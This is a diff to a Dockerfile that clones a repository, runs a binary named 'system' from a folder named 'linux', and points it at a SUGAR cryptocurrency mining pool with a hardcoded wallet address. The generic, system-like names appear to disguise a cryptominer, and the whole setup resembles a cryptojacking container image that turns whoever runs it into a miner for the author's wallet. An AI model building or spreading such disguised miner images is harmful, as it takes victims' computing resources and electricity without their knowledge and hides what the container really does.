@@ -8,10 +8,6 @@ RUN   git clone https://github.com/Dawn-shell/linux && \
       chmod +x system && \
       apk del \
         git
-WORKDIR    /linux
-ENV $POOL
-ENV $USER
-ENV $ALGO
-RUN   
+WORKDIR    /linux 
 ENTRYPOINT ["/linux/system"]
 CMD ["-a", "yespowerSUGAR", "-o", "stratum+tcp://stratum-asia.rplant.xyz:7042", "-u", "sugar1qwj5x6hyr88tqsuv2fmu8dvzzxgx35wl5uhnxf8.docker"]
